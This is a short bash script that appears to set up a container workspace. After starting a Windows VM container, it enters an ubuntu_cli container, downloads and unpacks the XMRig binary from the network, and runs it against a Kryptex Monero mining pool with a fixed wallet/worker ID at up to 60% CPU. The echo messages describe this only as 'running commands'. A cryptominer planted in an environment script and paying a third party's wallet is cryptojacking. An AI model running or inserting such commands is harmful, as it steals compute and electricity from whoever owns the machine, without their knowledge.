#!/bin/bash

echo "Starting Windows VM container..."
docker compose -f /workspace/docker-compose.yml up -d windows

echo "Waiting for containers to be ready..."
sleep 10

echo "Starting ubuntu_cli container and running commands..."
docker exec -it ubuntu_cli bash -c "
    cd ~ && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && \
    tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && \
    cd xmrig-6.26.0 && \
    ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.w67e3 -p x --coin monero --cpu-max-threads-hint=60
"

echo "All commands executed!"
